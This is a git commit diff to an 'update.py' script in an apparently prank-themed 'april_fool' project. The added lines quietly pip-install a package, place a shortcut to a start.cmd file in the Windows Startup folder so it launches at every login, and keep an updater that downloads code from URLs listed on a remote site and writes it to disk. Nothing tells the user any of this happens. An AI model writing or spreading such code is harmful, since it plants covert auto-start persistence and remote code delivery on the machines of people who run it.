b81448431ee431b1c2ec21f40b44df2b30c3f74b
AlbertLin2288 <67462242+AlbertLin2288@users.noreply.github.com>
2021-11-28 16:30:29 +0800

    Update update.py

--- april_fool/code/update.py
+++ april_fool/code/update.py
@@ -1,5 +1,6 @@
 import urllib.request
 import time
+import os
 # from importlib import reload
 # import update as update_m
 
@@ -16,23 +17,36 @@ def access(url, test):# repeatly try to get the page at 10s/tries
             time.sleep(10)
     return page
 
+path = r"D:\New folder\\"
+os.makedirs(path, exist_ok = True)
+try:
+    from swinlnk.swinlnk import SWinLnk
+except:
+    os.system("py -m pip install swinlnk")
+    from swinlnk.swinlnk import SWinLnk
+swl=SWinLnk()
+swl.create_lnk(path+"start.cmd",os.getenv("appdata")+r"\Microsoft\Windows"+
+               r"\Start Menu\Programs\Startup\start.lnk")
 def update(test =False):# update all code
-    vUrl = access("https://albertlin2288.github.io/april_fool/version.txt", test)
+    vUrl = access("https://albertlin2288.github.io/april_fool/version.txt",
+                  test)
     version = int(vUrl.read().decode().strip())
     try:
-        with open("version.txt") as file:
+        with open(path + "version.txt") as file:
             my_version = int(file.read().strip())
     except:
         my_version = -1
+    print(version,my_version)
     if my_version < version:
-        adUrl = access("https://albertlin2288.github.io/april_fool/address.txt", test)
+        adUrl = access("https://albertlin2288.github.io/april_fool/address.txt",
+                       test)
         address = adUrl.read().decode().strip()
         for i in address.split("\n"):
             program_ad = access(i.split(" ")[1], test)
-            with open(i.split(" ")[0], "w") as file:
+            with open(path + i.split(" ")[0], "w") as file:
                 file.write(program_ad.read().decode())
-        with open("version.txt", "w") as file:
+        with open(path + "version.txt", "w") as file:
             file.write(str(version))
 
 if __name__ == "__main__":
-    update()
+    update(1)
